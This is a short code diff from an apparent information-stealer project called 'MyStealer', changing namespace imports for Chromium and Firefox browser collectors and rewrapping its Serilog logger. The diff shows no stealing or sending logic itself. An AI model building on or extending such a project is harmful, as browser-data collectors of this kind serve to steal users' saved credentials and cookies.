@@ -1,7 +1,7 @@
-﻿using MyStealer.Collector.Modules.Browser;
-using MyStealer.Collectors.Browser.ChromiumBased;
-using MyStealer.Collectors.Browser.FirefoxBased;
-using MyStealer.Collectors.Game;
+﻿using MyStealer.Collector.Browser;
+using MyStealer.Collector.Browser.ChromiumBased;
+using MyStealer.Collector.Browser.FirefoxBased;
+using MyStealer.Shared;
 using Serilog;
 using System;
 using System.Collections.Generic;
@@ -44,8 +44,8 @@ namespace MyStealer
                     var logConfig = new LoggerConfiguration();
                     logConfig = (args.Length > 0 && args[0] == "verbose") ? logConfig.MinimumLevel.Verbose() : logConfig.MinimumLevel.Debug();
                     logConfig = logConfig.WriteTo.File(Config.LogFilePath, outputTemplate: LogTemplate, hooks: encHook);
-                    LogExt.BaseLogger = logConfig.CreateLogger();
-                    Log.Logger = LogExt.ForModule("Main");
+                    LogExt.BaseLogger = new SerilogDelegate(logConfig.CreateLogger());
+                    Log.Logger = ((SerilogDelegate)LogExt.ForModule("Main")).BaseLogger; // Completely f*** up the abstraction layer
 
                     /* Do the job */
 
